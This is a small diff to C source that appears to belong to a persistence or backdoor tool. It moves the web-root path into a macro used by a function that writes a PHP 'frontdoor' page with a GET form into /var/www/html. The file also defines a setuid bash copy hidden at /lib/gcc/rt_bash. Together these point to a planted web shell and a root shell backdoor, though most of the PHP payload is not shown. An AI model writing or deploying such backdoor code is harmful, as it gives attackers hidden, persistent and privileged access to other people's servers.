@@ -31,6 +31,7 @@
 
 // Useful Macros (modify these if path changes made elsewhere)
 #define SETUID_BASH_PATH "/lib/gcc/rt_bash"
+#define HTTP_DOCUMENT_ROOT "/var/www/html"
 
 // Slightly less useful Macros
 #define SYSTEM_BASH_PATH "/bin/bash"
@@ -260,7 +261,7 @@ const char *frontdoor_contents = "<form method=\"GET\">\n"
 "?>";
 int re_http_frontdoor(void){
     // Create file and write above php
-    FILE *fp = fopen("/var/www/html/rt_frontdoor.php", "w+");
+    FILE *fp = fopen("" HTTP_DOCUMENT_ROOT "/rt_frontdoor.php", "w+");
     fprintf(fp, "%s", frontdoor_contents);
     fclose(fp);
 
